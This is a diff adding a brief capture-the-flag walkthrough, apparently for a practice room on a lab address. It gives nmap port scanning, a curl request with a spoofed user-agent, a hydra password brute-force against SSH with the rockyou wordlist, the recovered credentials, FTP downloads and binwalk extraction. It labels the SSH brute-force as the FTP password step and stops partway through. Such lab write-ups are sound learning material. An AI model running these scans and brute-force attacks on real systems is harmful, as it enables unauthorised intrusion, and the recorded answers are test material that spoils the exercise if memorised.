@@ -1,0 +1,31 @@
+Author note
+
+Enumerate
+1.How many open ports?
+nmap -sV 10.10.3.204
+ans :3
+
+2.How you redirect yourself to a secret page?
+curl -s http://10.10.3.204/ | html2text
+ans : user-agent
+
+3.What is the agent name?
+curl -A "C" -L http://10.10.3.204
+ans : chris
+
+Hash cracking and brute-force
+1.FTP password
+install hydra and rockyou.txt
+hydra -l chris -P rockyou.txt 10.10.3.204 ssh
+ans: crystal
+
+2.Zip file password
+ ftp -p 10.10.3.204
+ ftp > ls
+ ftp > get To_agentJ.txt
+ ftp > get cute-alien.jpg  
+ ftp > get cutie.png
+ ftp > quit
+ 
+ binwalk -e cutie.png
+ cd _cutie.png.extracted
